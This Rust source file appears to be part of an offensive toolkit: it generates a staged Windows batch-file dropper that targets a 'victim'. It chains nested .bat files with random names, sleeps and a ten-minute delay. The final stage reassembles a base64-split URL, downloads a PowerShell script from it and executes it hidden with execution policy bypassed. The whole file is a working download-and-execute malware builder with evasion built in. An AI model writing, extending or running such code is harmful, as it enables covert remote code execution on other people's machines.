use anyhow::{Result, Context};
use colored::*;
use crate::utils::{validate_file_path, validate_url};
use rand::{seq::SliceRandom, rng};
use std::{
    fs,
    path::Path,
};

use base64::{engine::general_purpose::STANDARD as BASE64_STANDARD, Engine as _};
use tokio::io::{AsyncBufReadExt, AsyncWriteExt};

async fn prompt(prompt: &str) -> Result<String> {
    print!("{}", prompt.cyan().bold());
    tokio::io::stdout()
        .flush()
        .await
        .context("Failed to flush stdout")?;
    let mut buffer = String::new();
    tokio::io::BufReader::new(tokio::io::stdin())
        .read_line(&mut buffer)
        .await
        .context("Failed to read input")?;
    Ok(buffer.trim().to_string())
}

fn base64_split_encode(url: &str) -> (String, String) {
    let mid = url.len() / 2;
    let (first, second) = url.split_at(mid);
    let first_encoded = BASE64_STANDARD.encode(first);
    let second_encoded = BASE64_STANDARD.encode(second);
    (first_encoded, second_encoded)
}

fn write_payload_chain(stage1_path: &str, url: &str, output_ps1: &str) -> Result<()> {
    let mut symbols = vec![
        "æµ‹è¯•", "æ¸¬è©¦", "ä¾‹ãˆ", "ä¾‹å­", "ç¤ºä¾‹", "ç¤ºæ„", "æŽ¢ç´¢", "ç¥žç§˜",
        "âœ‚", "âœˆ", "â˜Ž", "â˜‚", "â˜¯", "âœ‰", "âœ", "âœ’", "âœ‡", "âœˆâœ‚", "ðŸ“Œ", "ðŸŽ´", "é …ç›®", "æ•°æ®", "æ ·æœ¬", "åˆ†æž",
    ];
    let mut rng = rng();
    symbols.shuffle(&mut rng);

    let s2 = symbols[0].to_string();
    let s3 = symbols[1].to_string();
    let s4 = symbols[2].to_string();
    let _f1 = symbols[3].to_string();
    let _f2 = symbols[4].to_string();
    let _f3 = symbols[5].to_string();

    let base = Path::new(stage1_path).parent().unwrap_or_else(|| Path::new("."));
    let _stage1 = Path::new(stage1_path);
    let _stage2 = base.join(format!("{s2}.bat"));
    let _stage3 = base.join(format!("{s3}.bat"));
    let _stage4 = base.join(format!("{s4}.bat"));

    // Encode URL
    let (part1_b64, part2_b64) = base64_split_encode(url);

    // === Stage 1: writes stage2.bat ===
    let stage1_contents = format!(
r#"@echo off
setlocal EnableDelayedExpansion
cls >nul
:: Sleep random 1-4 seconds
set /a RND=1+%RANDOM%%%4
timeout /t %RND% /nobreak >nul

:: Five explicit 1-second sleeps at stage 1
timeout /t 1 /nobreak >nul
timeout /t 1 /nobreak >nul
timeout /t 1 /nobreak >nul
timeout /t 1 /nobreak >nul
timeout /t 1 /nobreak >nul

echo Creating next stage...
(
echo @echo off
echo setlocal EnableDelayedExpansion
echo cls ^>nul
echo set /a RND=1+%%RANDOM%%%%4
echo timeout /t %%RND%% /nobreak ^>nul

:: Five explicit 1-second sleeps for stage 2
echo timeout /t 1 /nobreak ^>nul
echo timeout /t 1 /nobreak ^>nul
echo timeout /t 1 /nobreak ^>nul
echo timeout /t 1 /nobreak ^>nul
echo timeout /t 1 /nobreak ^>nul

echo echo Creating next stage...
echo (
    echo   @echo off
    echo   setlocal EnableDelayedExpansion
    echo   cls ^>nul
    echo   set /a RND=1+%%RANDOM%%%%4
    echo   timeout /t %%RND%% /nobreak ^>nul

    :: Five explicit 1-second sleeps for stage 3
    echo   timeout /t 1 /nobreak ^>nul
    echo   timeout /t 1 /nobreak ^>nul
    echo   timeout /t 1 /nobreak ^>nul
    echo   timeout /t 1 /nobreak ^>nul
    echo   timeout /t 1 /nobreak ^>nul

    echo   echo Creating final stage...
    echo   (
        echo     @echo off
        echo     setlocal EnableDelayedExpansion
        echo     cls ^>nul
        echo     set /a RND=1+%%RANDOM%%%%4
        echo     timeout /t %%RND%% /nobreak ^>nul
        echo     set part1={part1_b64}
        echo     set part2={part2_b64}
        echo     powershell -WindowStyle Hidden -Command ^^"
            echo       $p1 = $env:part1;
            echo       $p2 = $env:part2;
            echo       $u = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($p1)) + [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($p2));
            echo       Invoke-WebRequest -Uri $u -OutFile '{output_ps1}';
            echo       Start-Process -WindowStyle Hidden powershell -ArgumentList '-ExecutionPolicy Bypass -File {output_ps1}';
        echo     ^^"
        echo     exit
    echo   ) > "{s4}"
    echo   timeout /t 600 /nobreak ^>nul    :: Wait 10 minutes before stage 4
    echo   start "" /B "{s4}"              :: Launch stage 4 in background
    echo   exit
echo ) > "{s3}"
echo start "" /B "{s3}"                   :: Launch stage 3 in background
echo exit
) > "{s2}"

start "" /B "{s2}"                         :: Launch stage 2 in background
exit
"#);

    fs::write(_stage1, stage1_contents)?;

    Ok(())
}

pub async fn run(target: &str) -> Result<()> {
    println!("{}", format!("[*] Target context: {}", if target.is_empty() { "local" } else { target }).dimmed());
    let stage1_name = prompt("[+] Output BAT filename (stage 1): ").await?;
    let github_url = prompt("[+] GitHub raw URL of PowerShell script: ").await?;
    let ps1_output = prompt("[+] Name to save .ps1 as on victim: ").await?;

    // Validate inputs
    let validated_stage1 = validate_file_path(&stage1_name, true)
        .map_err(|e| anyhow::anyhow!("Invalid BAT filename: {}", e))?;
    let validated_url = validate_url(&github_url, Some(&["http", "https"]))
        .map_err(|e| anyhow::anyhow!("Invalid GitHub URL: {}", e))?;
    let validated_ps1 = validate_file_path(&ps1_output, false)
        .map_err(|e| anyhow::anyhow!("Invalid .ps1 filename: {}", e))?;

    write_payload_chain(&validated_stage1, &validated_url, &validated_ps1)?;
    println!("[+] Stage 1 payload written to {stage1_name}");
    println!("[*] Chain will execute real .bat files one after the other with random jitter.");
    Ok(())
}
